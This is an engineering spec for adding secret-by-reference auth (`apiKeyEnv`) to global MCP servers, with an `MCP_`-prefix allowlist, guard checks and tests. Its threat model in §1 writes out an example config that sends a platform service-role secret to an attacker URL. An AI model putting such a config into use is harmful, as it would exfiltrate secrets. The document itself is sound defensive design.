# PHASE MCP-SECRET-REF-1 — Secret-by-Reference (`apiKeyEnv`) for Global MCP Servers · v1
<!-- rev 1 · 2026-07-06 · Author lane (AG / Claude Code on AntiGravity). Implements the
     secret-by-reference design note (cwf-secret-by-reference-global-mcp-design-v1) WITH the
     three AG refinements folded in — refinement #1 (env-name allowlist) supersedes design-note
     §5/§8. §8.1 resolved: (A), ARMES-MES already dials stdio→HTTP (no subprocess; Architect-
     verified at 2f94a66). Code-grounded at master HEAD 2f94a66. SECURITY-RELEVANT: touches the
     chat-path header build + resolves a secret from env + updates the global secret-guard →
     FULL REVIEW, not hotfix mode. No migration (config field rides existing jsonb rows). -->

---

## 0. HARD PRE-FLIGHT GATE (all literally true before any change)

- [ ] Fresh clone; `git rev-parse origin/master` == **`2f94a66…`** (RULE 25 — verification starts here).
- [ ] `npm ci` clean; baseline **869/869 tests (86 files)** green BEFORE any change (paste counts).
- [ ] **Drift gate green** (`check:doc-drift` → `[OK]`) on the untouched clone (paste the line).
- [ ] Read §1 (the security core is the `MCP_` allowlist — without it this feature is an
      arbitrary-secret-exfil vector) and §2 (the chat-path is deliberately touched here — prove
      the personal `apiKey` path stays byte-identical).

## 1. What this is + the security core

A global MCP server today cannot carry auth (the secret-guard forbids a value in the world-readable
global row; the merge is replace-by-id so a personal row can't inject just a token). This phase adds
**`apiKeyEnv`** — a global server names an ENV VAR holding its bearer token; the chat engine resolves
it SERVER-SIDE at request time. One global entry → every user gets the authenticated backend; the
token lives only in env. **No `mergeMcpServers` change** (a global `apiKeyEnv` row is self-sufficient).

**THE SECURITY CORE (do not ship without it):** an unbounded `apiKeyEnv` lets a super_admin write
`{ url:'https://attacker', apiKeyEnv:'SUPABASE_SERVICE_ROLE' }` and exfiltrate ANY platform secret's
value into an Authorization header sent to an attacker URL — an escalation beyond the super_admin
surface. Therefore the resolver honors ONLY env names matching **`^MCP_[A-Z0-9_]+$`**. Any other name
(a platform secret like `SUPABASE_SERVICE_ROLE`, `LANGFUSE_*`, etc.) → **no header resolved** +
server-side warning (name only). This is what makes it a *token* pointer, not an *arbitrary-secret*
pointer. The ARMES token is provisioned as **`MCP_ARMES_TOKEN`**.

## 2. HARD CONSTRAINTS (violating any = rejected review)

**2.1 — `MCP_` allowlist is mandatory and enforced in the RESOLVER** (not just the UI/guard). A
non-`MCP_` `apiKeyEnv` never resolves a value, at any of the three call sites. Test proves
`apiKeyEnv:'SUPABASE_SERVICE_ROLE'` yields NO Authorization header even when that env var is set.

**2.2 — Personal `apiKey` path stays byte-identical.** `server.apiKey` (a value, personal rows)
must produce the exact same `Authorization: Bearer <apiKey>` header as today. All existing MCP tests
pass unchanged. The resolver's precedence: `apiKey` (value) wins if present; else `apiKeyEnv`
(resolved, allowlisted); else no auth header. Prove parity.

**2.3 — ONE shared resolver, three call sites collapse to it.** `mcpClient.ts:124`,
`mcpDiscovery.ts:73`, and the probe's `resolveTarget` (mcp-probe.ts) currently each inline
`if (server.apiKey) headers['Authorization']='Bearer ${server.apiKey}'`. Replace ALL THREE with a
call to one shared `resolveAuthHeader(server)` — no fourth copy, no divergence. The probe MUST use
it so an `apiKeyEnv` global server probes with the resolved token (else it always reads `auth`).

**2.4 — Graceful-off, never crash, never leak.** An unset or disallowed `apiKeyEnv` → no
Authorization header (the server then 401s; the probe shows `auth` — honest). The server-side log
names the env VAR (never the resolved value). No token value ever enters a DB row, a telemetry
event, or a client response.

**2.5 — Secret-guard stays correct, gets stricter.** `detectGlobalSecretViolation`
(shared/mcpSecrets.ts) keeps rejecting `apiKey`/`headers`/`env`/`Bearer`-in-args on the global path,
AND now validates: a global entry with an `apiKeyEnv` that is not `^MCP_[A-Z0-9_]+$` → violation
(422, field named). A value-bearing global entry is still refused.

**2.6 — Secrets hygiene:** no real secret in code/tests/report; fixtures use `MCP_FAKE_TEST_TOKEN`
with an obviously-fake value. No new secret literal anywhere.

**2.7 — Scope:** MCP config type + resolver + the three sites + guard + the MCP-UX-1 import path
(§3-D) + the UI name field. Do NOT touch grounding/replay/knowledge/eval-gate/trust/IAM. No
`mergeMcpServers` change. No migration.

## 3. GATED SUB-PHASES (in order; each green before the next)

### Sub-phase A — the field
Add `apiKeyEnv?: string` to `MCPServerConfig` (src/lib/mcpConfig.ts) and `MCPServerDef`
(api/cwf/_lib/turn/types.ts), documented as "the NAME of an env var holding the bearer token
(must match `^MCP_[A-Z0-9_]+$`); the value is resolved server-side and NEVER stored."

### Sub-phase B — the shared resolver (the security core)
New `resolveAuthHeader(server): Record<string,string>` (e.g. api/cwf/_lib/mcp/resolveAuthHeader.ts):
```
if server.apiKey (non-empty)      → { Authorization: `Bearer ${server.apiKey}` }   // personal, byte-identical
else if server.apiKeyEnv:
    if !/^MCP_[A-Z0-9_]+$/.test(name) → warn(name only); return {}                  // 2.1 exfil bound
    const v = process.env[name];
    if v (non-empty)              → { Authorization: `Bearer ${v}` }
    else                          → warn(name only, "unset"); return {}             // 2.4 graceful-off
else                              → {}
```
Then merge `server.headers` after (unchanged). Replace the inline header build at ALL THREE sites
(mcpClient, mcpDiscovery, mcp-probe `resolveTarget`) with `resolveAuthHeader(server)`. The stdio
path keeps using `extractHTTPFromStdioArgs` for the URL; auth now comes from the resolver (so a
plain `sse` ARMES config with `apiKeyEnv` works, and a legacy stdio-args `--header` still works via
`extractHTTPFromStdioArgs`'s own header extraction — do not regress it).

### Sub-phase C — secret-guard validation (shared/mcpSecrets.ts)
Add to `detectGlobalSecretViolation`: if `apiKeyEnv` is present and NOT `^MCP_[A-Z0-9_]+$` → return
a reason ("apiKeyEnv must name an MCP_-prefixed env var"). Keep all existing value-bearing
rejections. `apiKeyEnv` matching the pattern is CLEAN for global (it's a name). Personal path
unchanged. Tests: global `{apiKeyEnv:'MCP_ARMES_TOKEN'}` → accepted; `{apiKeyEnv:'SUPABASE_SERVICE_ROLE'}`
→ 422; `{apiKey:'x'}` → still 422.

### Sub-phase D — thread `apiKeyEnv` through MCP-UX-1's import path (AG refinement #2)
The MCP-UX-1 import path enumerates fields, so it will DROP an unknown one. Thread `apiKeyEnv`
through: `parseMCPConfigStrict`'s ok-entry mapping, the add-server form state, and
`maskMcpConfigForDisplay` (render `apiKeyEnv` VERBATIM — it is a name, not a secret; only
apiKey/headers/args-Bearer are masked). Test: a JSON import carrying `apiKeyEnv` round-trips it
(not dropped); the masked JSON view shows the name in clear.

### Sub-phase E — UI affordance
Add/edit `apiKeyEnv` on a server (a labeled NAME field, e.g. "API key env var (MCP_…)"), per the
admin-panel rule: the UI stores the NAME, never a value. Client-side hint if the name doesn't match
`MCP_…` (the server guard is authoritative). Keep it plain (not a UI-polish phase).

### Sub-phase F — reseal
Mapped `api/**` changed (resolver + the three sites + guard) → reseal the affected tab(s)
(Governance Model / Architecture Map as the maps show it); bump `public/architecture/manifest.json`
docVersion **41 → 42**. Two-commit seal (code+reseal, then changelog). Diff scope EXPLICITLY
permits `.agents/CHANGELOG.md`, `public/architecture/manifest.json`, and the frontend service
method(s). Merge `--no-ff` (squash banned). Drift ends `[OK]`.

## 4. SELF-VERIFICATION (literal evidence; "build green" is not evidence)

1. Baseline `869/869 (86 files)` and final `869+N/869+N`, N itemized per test file.
2. **Exfil bound (2.1, the security test):** with `SUPABASE_SERVICE_ROLE` (or any non-`MCP_` var)
   SET in the test env, a server `{apiKeyEnv:'SUPABASE_SERVICE_ROLE'}` resolves NO Authorization
   header; a server `{apiKeyEnv:'MCP_ARMES_TOKEN'}` with that env set resolves the header. Paste
   both.
3. **Personal parity (2.2):** existing MCP client/discovery/probe tests pass UNCHANGED; an explicit
   test that `resolveAuthHeader({apiKey:'x'})` === `{Authorization:'Bearer x'}` (byte-identical to
   the pre-change inline).
4. **Graceful-off (2.4):** unset `MCP_ARMES_TOKEN` → resolver returns `{}` (no header), and the
   server-side log line contains the NAME and NOT any value.
5. **One resolver (2.3):** grep proof that no `Bearer ${server.apiKey}` inline remains at the three
   sites — all call `resolveAuthHeader`. Probe test: an `apiKeyEnv` server with the env set probes
   `ok`, without it probes `auth`.
6. **Guard (2.5):** the three C-tests (MCP_ accepted / non-MCP_ 422 / value 422).
7. **Import threading (D):** `apiKeyEnv` survives a strict import and shows verbatim in the masked
   view.
8. Drift `[OK]` + docVersion **42** + two-commit shas + `git rev-parse origin/master` after push
   (RULE 25) + independent recount of tests 2/3/6.

## 5. YOUR ACTION ITEMS (for Maymun)

- **None pre-build.** No migration, no Operator apply.
- **After review + merge (the activation, in order):**
  1. Set the Vercel env var **`MCP_ARMES_TOKEN`** = the current ARMES daily token value (and
     likewise `MCP_SUPERSET_TOKEN` if you move Superset to global).
  2. In the MCP panel, add ARMES as a **GLOBAL** `sse` server: `url` (the ARMES MCP endpoint —
     the same URL the stdio args dial today) + `apiKeyEnv: MCP_ARMES_TOKEN` + `backend_id: armes`.
     Then every user gets authenticated ARMES; the per-user personal rows are no longer needed.
  3. **Daily rotation becomes one step:** update the `MCP_ARMES_TOKEN` env var — no per-user rows.
- The six skeleton "Server N" global rows remain your direct UI-delete cleanup (unrelated).

If any step forces an unlisted manual action, STOP and surface it as a new "YOUR ACTION ITEMS" line.
